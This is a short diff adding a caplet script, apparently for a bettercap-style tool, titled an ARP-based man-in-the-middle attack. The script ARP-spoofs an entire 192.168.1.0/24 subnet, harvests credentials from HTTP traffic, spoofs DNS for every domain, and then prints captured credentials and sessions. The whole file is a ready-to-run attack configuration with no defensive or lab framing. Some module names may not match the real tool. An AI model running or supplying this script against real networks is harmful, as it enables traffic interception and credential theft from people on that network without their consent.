@@ -1,0 +1,28 @@
+# mitm-arp.caplet — ARP-based man-in-the-middle attack
+# Performs ARP spoofing to intercept traffic between victims and the gateway.
+
+# Set target subnet for ARP spoofing
+set arp.spoof.targets 192.168.1.0/24
+set arp.spoof.fullduplex true
+
+# Start ARP spoofing
+on arp.spoof
+
+# Start passive credential harvesting
+on http.harvest
+
+# Start DNS spoofing for all domains
+set dns.spoof.all true
+on dns.spoof
+
+# Run for 5 minutes
+sleep 300
+
+# Stop all modules
+off dns.spoof
+off http.harvest
+off arp.spoof
+
+# Show results
+creds.show
+sessions.show
